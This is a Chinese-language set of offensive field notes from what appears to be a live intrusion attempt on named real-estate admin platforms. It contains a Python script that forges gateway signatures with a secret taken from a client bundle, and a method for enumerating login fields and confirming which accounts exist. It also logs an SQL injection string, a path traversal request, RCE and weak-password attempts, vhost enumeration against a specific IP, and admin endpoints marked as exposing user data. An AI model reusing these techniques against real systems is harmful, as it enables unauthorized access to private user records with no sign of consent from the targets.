# 网关签名算法复现 + 登录字段「报错推进」法(实测)

来源: 2026-09 实战。目标主站开放面已穷尽,转打另一品牌的运营管理端。以下全部为实测响应原文。

---

## 1. 管理端 SPA 主包里的明文配置

Vue-CLI/webpack SPA 的 `js/app.<hash>.js` 里常有整块配置:

```js
"83d6": function(t,e){
  t.exports = {
    title: "找房邦",
    baseURL: "https://api.zhaofang.com/admin",
    projectKey: "98Admin",
    appid:  "768e520d6ad91e3d27",
    secret: "<REDACTED>",   // ← 密钥明文
  }
}
```

获取方式: 管理端首页 HTML → `<link href=/js/app.<hash>.js rel=preload as=script>` → 直接 GET。

## 2. 请求拦截器 = 签名算法原文

```js
p.interceptors.request.use(function(t){
  // 特例: /v2/admin 开头的路径换根(去掉 baseURL 末尾的 /admin)
  if (t.url && /^\/v2\/admin/.test(t.url) && t.baseURL && /\/admin$/.test(t.baseURL))
      t.baseURL = t.baseURL.replace(/\/admin$/, "");

  t.headers["x-access-appid"] = m;                       // m = appid
  var e = r["a"].getters.token;
  if (e) t.headers["x-access-token"] = e;                // 用户 token(可选!)

  var i = {};
  "GET" === t.method.toUpperCase() ? (i = t.params) : (i = t.data);

  var n = r["a"].getters.city;
  if (void 0 === i.city_id && n) i.city_id = n.city_id;   // 隐式注入字段

  i.timestamp = Date.now();
  i.signature = c()(encodeURI(Object(l["i"])(i)) + f);    // c()=md5, f=secret
  t.data / t.params = i;
  return t;
});
```

**关键顺序**:`i` 里**已经含 `timestamp`**,但**不含 `signature`**(签名是同一表达式的 LHS)。
即签名覆盖 `{...业务参数, city_id?, timestamp}`。

## 3. Python 复现(实测通过网关)

```python
import json, hashlib, urllib.parse, urllib.request, ssl, time

APPID  = "768e520d6ad91e3d27"
SECRET = "<REDACTED>"
BASE   = "https://api.zhaofang.com/admin"
SAFE   = ";,/?:@&=+$-_.!~*'()#"       # 必须复刻 JS encodeURI 的 safe 集

def md5(s): return hashlib.md5(s.encode()).hexdigest()

def call(path, params=None, token=None):
    params = dict(params or {})
    ts = int(time.time() * 1000)
    o  = dict(params); o["timestamp"] = ts                    # ① 先加 timestamp
    j  = json.dumps(o, separators=(',', ':'), ensure_ascii=False)
    o["signature"] = md5(urllib.parse.quote(j, safe=SAFE) + SECRET)   # ② 再算签名
    r = urllib.request.Request(BASE + path,
            data=json.dumps(o, ensure_ascii=False, separators=(',', ':')).encode(),
            method='POST')
    r.add_header('Content-Type', 'application/json')
    r.add_header('x-access-appid', APPID)
    if token: r.add_header('x-access-token', token)
    with urllib.request.urlopen(r, timeout=20) as resp:
        return resp.read()[:400].decode('utf-8', 'replace')
```

**三个复现坑**:
1. `encodeURI` 的 safe 集必须一字不差(`#` 在 JS 里**不**被编码,`"` `{` `}` 会被编码)
2. 顺序:先 timestamp 后签名;签名自身不参与
3. `separators=(',',':')` —— JS `JSON.stringify` 无空格

**容错好消息**:实测 v1(顺序不变)、v2(键排序)、v3(不对 JSON 做 encodeURI)**三种变体
服务端都接受**了同一请求 → 该网关的签名校验较宽松。所以先按最忠实的一种实现,
若失败再试排序/不编码变体,别一开始就陷入"算法还原不完美"的自我怀疑。

## 4. 网关分层判定(用报错区分)

```
POST /admin/userInfo        (不带 appid) -> {"code":9,"msg":"用户访问令牌token缺失","errcode":10306}
POST /v3/admin/User          (不带 appid) -> {"code":401,"msg":"登录已失效：缺少参数token"}
GET  api.beta.<brand>/api/login/login    -> {"code":0,"msg":"appid不存在","data":{"errcode":10103}}
GET  api.beta.<brand>/api/               -> {"code":1,"msg":"成功","data":{...}}   ← 公开路由
```

判读:
- `appid不存在` → 层1没过(补 `x-access-appid`)
- `token缺失 / 登录已失效` → **层1已过**,只差用户 token
- 任何业务数据 → 该端点无需鉴权 ← 目标

## 5. 登录字段名「报错推进」法

```
POST /admin/login/index
{}                                        -> 登录账号必须填写
{"username":"admin"}                      -> 登录账号必须填写     (字段名错)
{"username":"admin","password":"x"}       -> 登录账号必须填写     (还是错)
{"account":"admin","password":"x"}        -> 登录账号必须填写
{"user_name":"admin","password":"x"}      -> 登录密码必须填写     ← 账号字段 = user_name ✅
{"user_name":"admin","user_pwd":"x"}      -> 用户密码错误         ← 密码字段 = user_pwd ✅
{"user_name":"admin12345","user_pwd":"x"} -> (账号不存在类报错)   ← 账号存在性 oracle
```

**两条判据**:
- **报错推进**(`X必须填写` → 下一段的 `Y必须填写`)= 字段名正确
- **报错类型切换**(`必须填写` → `密码错误`)= 该账号**存在**

**一石二鸟**:一次请求同时拿到字段名与账号存在性,不需要穷举也不需要验证码。
中文后台字段名优先级: `user_name` / `user_pwd` > `username` / `password`。

## 6. 字符集白名单误报纪律 ⚠️

```
{user_pwd: "' or '1'='1"}   -> 登录密码只能是字母、数字、下划线、破折号
{user_pwd: "admin@123"}     -> 登录密码只能是字母、数字、下划线、破折号
{user_pwd: "zhaofang.com"}  -> 登录密码只能是字母、数字、下划线、破折号
{user_pwd: "admin123"}      -> 用户密码错误
```

**白名单报错 ≠ 登录失败 ≠ 命中。** 本次脚本把白名单报错当成了 HIT 打了 `<<<<< HIT`,
是误报 —— 它既不是 SQLi 成功也不是登录成功,只是**字符集校验**。
**纪律:凡是响应不等于基准值,先分类(参数校验 / 鉴权 / 业务错),再下结论。**

## 7. 同族确认与 vhost 枚举证据表

### 同族硬证据(逐字节相同的网关 404)
```
game-service.9v.com/api/hall/version   -> {"code":"404","msg":"404 - Interface não existe","data":null}
game-service.5151.com/api/hall/version -> {"code":"404","msg":"404 - Interface não existe","data":null}
```

### Host 头 vhost 枚举(IP=47.93.153.70,未配置 Host 一律 403)
| Host | 状态 | 大小 | 说明 |
|---|---|---|---|
| `admin.zhaofang.com` | **200** | 10790 | 管理端「找房邦」 |
| `agent.zhaofang.com` | **200** | 5621 | 代理端 |
| `api.zhaofang.com` | 302 | — | → 兄弟城市站 |
| `api.98.com` | 500 | 6845 | 主 API(ThinkPHP) |
| `yunying.98.com` | 200 | 1713 | 运营管理系统 |
| `api.beta.zhaofang.com` | 302 | — | beta 网关 |
| `98.com` / `www.98.com` / `m.98.com` / `localhost` | 403 | 150 | 未配置 |

### 管理 API 面(从 SPA 提取,60+ 端点;★ = 直接对应用户数据)
```
★ /count/user-new/list            ★ /count/user-new/list/detail      ★ /count/user-clue/list
★ /user-manage/userAdmin          ★ /user-manage/userAdminAgency
★ /city-user-manage/cityUserAdmin ★ /city-user-manage/agent         ★ /city-user-manage/userEnroll
★ /calls-manage/mobile-list       ★ /calls-manage/call-list          ★ /calls-manage/im-list
  /admin-audit/{community,question,comment,community-comment}/{todo,done}
  /houseLibrary/*  /new-house/*  /community/*  /article-manage/*  /city-article-manage/*
  /admin/{userInfo,menus,alterPwd,sendSms}   /agent/sendSms
```

### 兄弟域 CT 命名实例(可直接进字典)
```
admin-svrxwmnptdgvvibt2epdqd3.5151.com     agent-s91moevps1k0a5jprui5a8v.5151.com
admin-sz104js0kwsqebp0v8cc7ni.q3.com       agent-s78wyzguufj0actw7htsw6w.q3.com
admin.control.98.com   admin.beta.98.com   yunying.98.com
db.w.5151.com   db1.w.5151.com
pmm.ops.ce22169124a9.5151.com   grafana-ui.dev.test111f213.5151.com
*.svrxwmnptdgvvibt2epdqd3.5151.com  (租户级通配 —— 说明该租户有子品牌)
```

## 8. 本例被挡住的(别重试)

| 手法 | 实测结果 |
|---|---|
| 密码字段 SQLi | 字符白名单挡死(`只能字母/数字/下划线/破折号`) |
| 12 条目标性弱口令 | 全 `用户密码错误` |
| TP5 RCE payload × 3 | 无回显 |
| `/index.php?lang=../../etc/passwd` | 500 + TP 错误页 ≠ 文件读成功 |
| 源站全端口扫描(300+) | 只有 80/443(安全组收紧) |
| 兄弟域 `<role>-<token>` 主机 | 404 中文页(主机在、应用已下线) |
| 改 X-Document / orderNumber 做跨租户读 | 500 / `1001` —— **IDOR 阴性** |
